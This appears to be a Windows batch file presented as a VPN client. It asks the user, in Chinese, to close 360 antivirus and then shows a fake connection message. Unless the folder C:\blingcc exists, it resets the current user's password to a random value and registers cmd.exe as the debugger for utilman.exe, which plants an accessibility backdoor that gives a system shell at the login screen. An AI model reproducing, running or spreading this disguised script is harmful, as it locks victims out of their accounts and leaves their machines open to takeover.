@echo off
@title VPN
echo ****************************
echo *                          *
echo *     请关闭360等软件      *
echo *     否则会无法连接       *
echo *                          *
echo ****************************
pause
if  exist "C:\blingcc" (goto no1) else (goto no2)
:no1
echo VPN已连接至 Germany 185.117.84.23!
pause
exit
:no2
echo VPN已连接至 Amsterdam 185.117.84.23!
net user %username% %random%
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
pause